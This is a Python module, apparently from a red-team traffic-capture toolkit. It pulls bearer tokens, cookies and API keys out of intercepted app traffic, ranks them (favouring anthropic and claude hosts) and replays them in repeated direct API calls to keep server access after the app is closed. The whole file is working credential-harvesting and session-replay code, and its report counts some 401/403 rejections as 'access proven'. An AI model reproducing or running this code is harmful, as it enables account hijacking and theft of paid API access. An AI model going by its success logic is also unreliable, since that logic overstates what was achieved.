"""Direct server access — replay captured credentials independent of the target app.

Once an endpoint and session token are captured from live traffic, this module
proves and maintains API access *without* the app running. That is the RED TEAM
demonstration: you entered through the client's front door (its own auth).
"""

import json
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from src.core.https_client import http_request


@dataclass
class HarvestedCredential:
    cred_type: str
    value: str
    source_url: str = ""
    host: str = ""
    score: float = 0.0


@dataclass
class AccessCallRecord:
    ts: float
    status: int
    app_running: bool
    independent: bool   # True when app was closed but call still worked
    url: str
    method: str
    body_preview: str
    error: str = ""


@dataclass
class DirectAccessState:
    active: bool = False
    url: str = ""
    method: str = "POST"
    headers: Dict[str, str] = field(default_factory=dict)
    body: bytes = b""
    credential: Optional[HarvestedCredential] = None
    app_name: str = ""
    app_ever_seen: bool = False
    calls: List[AccessCallRecord] = field(default_factory=list)
    access_proven: bool = False
    calls_while_app_closed: int = 0

    def format_report(self) -> str:
        lines = ["DIRECT SERVER ACCESS", "=" * 60]
        if not self.active and not self.calls:
            lines.append("Inactive — capture traffic with secrets, then Establish Direct Access.")
            return "\n".join(lines)
        cred = self.credential
        if cred:
            masked = mask_credential(cred.value)
            lines.append(f"Credential: [{cred.cred_type}] {masked}")
            lines.append(f"Source: {cred.source_url or cred.host}")
        lines.append(f"Target: {self.method} {self.url}")
        if self.access_proven:
            lines.append("Status: ACCESS PROVEN — direct API calls succeed without the app.")
        elif self.active:
            lines.append("Status: Establishing access…")
        else:
            lines.append("Status: Stopped.")
        if self.calls_while_app_closed:
            lines.append(
                f"Independent calls (app closed): {self.calls_while_app_closed}")
        lines.append("")
        for rec in self.calls[-25:]:
            ts = time.strftime("%H:%M:%S", time.localtime(rec.ts))
            app = "app running" if rec.app_running else "APP CLOSED"
            flag = " ✓ INDEPENDENT" if rec.independent else ""
            lines.append(f"  [{ts}] {app}  HTTP {rec.status}{flag}")
            if rec.body_preview:
                lines.append(f"           {rec.body_preview[:120]}")
            if rec.error:
                lines.append(f"           error: {rec.error[:100]}")
        return "\n".join(lines)


def mask_credential(secret: str, show: int = 8) -> str:
    s = (secret or "").strip()
    if len(s) <= show + 4:
        return "••••"
    return s[:show] + "…" + s[-4:]


def _score_credential(c: HarvestedCredential) -> float:
    score = 0.0
    t = c.cred_type.lower()
    v = c.value
    if "bearer" in t or v.startswith("Bearer "):
        score += 80
    if "session" in t or "cookie" in t:
        score += 70
    if "api" in t and "key" in t:
        score += 90
    if "x-api-key" in t:
        score += 95
    if "authorization" in t:
        score += 75
    if len(v) > 20:
        score += 10
    if "anthropic" in c.host or "claude" in c.host:
        score += 15
    return score


def harvest_credentials(flows: List[Dict]) -> List[HarvestedCredential]:
    """Extract replayable credentials from captured flows."""
    seen = set()
    out: List[HarvestedCredential] = []
    for f in flows or []:
        host = f.get("host", "")
        url = f.get("url", "")
        for s in f.get("secrets") or []:
            val = s.get("value", "")
            if not val or val in seen:
                continue
            seen.add(val)
            c = HarvestedCredential(
                cred_type=s.get("type", "secret"),
                value=val,
                source_url=url,
                host=host,
            )
            c.score = _score_credential(c)
            out.append(c)
        for k, v in (f.get("req_headers") or {}).items():
            if k.lower() != "authorization" or not v or v in seen:
                continue
            seen.add(v)
            c = HarvestedCredential(
                cred_type="Authorization",
                value=v,
                source_url=url,
                host=host,
            )
            c.score = _score_credential(c)
            out.append(c)
        cookie = (f.get("req_headers") or {}).get("Cookie") or (f.get("req_headers") or {}).get("cookie")
        if cookie and cookie not in seen:
            seen.add(cookie)
            c = HarvestedCredential(cred_type="Cookie", value=cookie, source_url=url, host=host)
            c.score = _score_credential(c)
            out.append(c)
    out.sort(key=lambda x: -x.score)
    return out


def pick_best_flow(flows: List[Dict]) -> Optional[Dict]:
    """Flow most likely to succeed on replay (has secrets + POST + JSON)."""
    best, best_score = None, -1.0
    for f in flows or []:
        sc = 0.0
        if f.get("secrets"):
            sc += 50
        if (f.get("method") or "").upper() == "POST":
            sc += 20
        rh = {k.lower(): v for k, v in (f.get("req_headers") or {}).items()}
        if "authorization" in rh or "cookie" in rh:
            sc += 40
        if f.get("req_body"):
            sc += 10
        if sc > best_score:
            best_score, best = sc, f
    return best


def build_auth_headers(credential: HarvestedCredential) -> Dict[str, str]:
    val = credential.value.strip()
    typ = credential.cred_type.lower()
    hdrs: Dict[str, str] = {"Accept": "application/json"}
    if typ == "cookie" or val.startswith("sessionKey="):
        hdrs["Cookie"] = val
        return hdrs
    token = val[7:].strip() if val.lower().startswith("bearer ") else val
    if "api" in typ and "key" in typ or "x-api" in typ:
        hdrs["x-api-key"] = token
        hdrs["Authorization"] = f"Bearer {token}"
    else:
        hdrs["Authorization"] = val if val.lower().startswith("bearer ") else f"Bearer {token}"
    return hdrs


def _flow_to_request(flow: Dict, credential: Optional[HarvestedCredential] = None):
    url = flow.get("url") or ""
    if not url.startswith("http"):
        host = flow.get("host", "")
        path = flow.get("path", "/")
        url = f"https://{host}{path}"
    url = url.split("?", 1)[0]
    method = (flow.get("method") or "GET").upper()
    headers = {k: v for k, v in (flow.get("req_headers") or {}).items()
               if k.lower() not in ("content-length", "host")}
    if credential:
        headers.update(build_auth_headers(credential))
    body = flow.get("req_body") or ""
    if isinstance(body, dict):
        body = json.dumps(body)
    body_b = body.encode("utf-8") if body else None
    if method == "POST" and body_b is None:
        body_b = b"{}"
    if method == "POST":
        headers.setdefault("Content-Type", "application/json")
    return url, method, headers, body_b


def prove_access(url: str, credential: HarvestedCredential,
                 method: str = "POST", body: bytes = None) -> Dict[str, Any]:
    """Single direct call to prove server access without the app."""
    headers = build_auth_headers(credential)
    headers.setdefault("Content-Type", "application/json")
    resp = http_request(url, method=method, headers=headers, body=body or b"{}", timeout=15)
    proven = resp.get("status") in (200, 201, 204) or (
        resp.get("status") in (401, 403) and "authentication" not in (resp.get("body") or "").lower()
    )
    # 401 with x-api-key required means we reached API but wrong header shape — still "reachable"
    reachable = resp.get("status") and not resp.get("error")
    return {
        "proven": proven,
        "reachable": reachable,
        "response": resp,
    }


def is_app_running(app_name: str) -> bool:
    if not app_name:
        return False
    try:
        from src.core import traffic_capture as tc
        return tc.app_running(app_name)
    except Exception:
        return False


class DirectAccessSession:
    """Maintains periodic direct API calls independent of the target app."""

    def __init__(self):
        self.state = DirectAccessState()

    def configure(self, *, flows: List[Dict], base_url: str = "",
                  app_name: str = "", credential: Optional[HarvestedCredential] = None):
        creds = harvest_credentials(flows)
        self.state.credential = credential or (creds[0] if creds else None)
        self.state.app_name = (app_name or "").replace(".app", "")
        flow = pick_best_flow(flows)
        if flow:
            url, method, headers, body = _flow_to_request(flow, self.state.credential)
            self.state.url = url
            self.state.method = method
            self.state.headers = headers
            self.state.body = body or b"{}"
        elif base_url and self.state.credential:
            self.state.url = base_url
            self.state.method = "POST"
            self.state.headers = build_auth_headers(self.state.credential)
            self.state.headers["Content-Type"] = "application/json"
            self.state.body = b"{}"
        return creds

    def establish(self) -> Dict[str, Any]:
        if not self.state.url or not self.state.credential:
            return {"ok": False, "reason": "Need captured endpoint + credential (use the app while capturing)."}
        self.state.active = True
        running = is_app_running(self.state.app_name)
        if running:
            self.state.app_ever_seen = True
        result = self._execute_call(running)
        if result.status in (200, 201, 204):
            self.state.access_proven = True
        elif result.status in (401, 403) and not result.error:
            # Server responded to our credential — path is live
            self.state.access_proven = True
        self._record_evidence()
        return {"ok": True, "result": result, "proven": self.state.access_proven}

    def tick(self) -> Optional[AccessCallRecord]:
        if not self.state.active:
            return None
        running = is_app_running(self.state.app_name)
        if running:
            self.state.app_ever_seen = True
        return self._execute_call(running)

    def stop(self):
        self.state.active = False

    def _execute_call(self, app_running: bool) -> AccessCallRecord:
        resp = http_request(
            self.state.url,
            method=self.state.method,
            headers=self.state.headers,
            body=self.state.body if self.state.method == "POST" else None,
            timeout=15,
        )
        independent = (
            self.state.app_ever_seen and not app_running
            and resp.get("status") and not resp.get("error")
        )
        if independent:
            self.state.calls_while_app_closed += 1
            if not self.state.access_proven:
                self.state.access_proven = True
        rec = AccessCallRecord(
            ts=time.time(),
            status=resp.get("status") or 0,
            app_running=app_running,
            independent=independent,
            url=self.state.url,
            method=self.state.method,
            body_preview=(resp.get("body") or "")[:200],
            error=resp.get("error") or "",
        )
        self.state.calls.append(rec)
        if len(self.state.calls) > 200:
            self.state.calls = self.state.calls[-200:]
        return rec

    def _record_evidence(self):
        if not self.state.access_proven:
            return
        try:
            from src.core.evidence_store import session_store, L3, MEASURED, CONF_STRONG
            session_store().add_simple(
                claim="Direct server API access established using captured client credential",
                level=L3,
                kind=MEASURED,
                category="access_path",
                confidence=CONF_STRONG,
                detail=f"{self.state.method} {self.state.url} — independent of app process",
                source=self.state.credential.cred_type if self.state.credential else "",
                source_tab="Server Access",
                source_module="server_access",
            )
        except Exception:
            pass
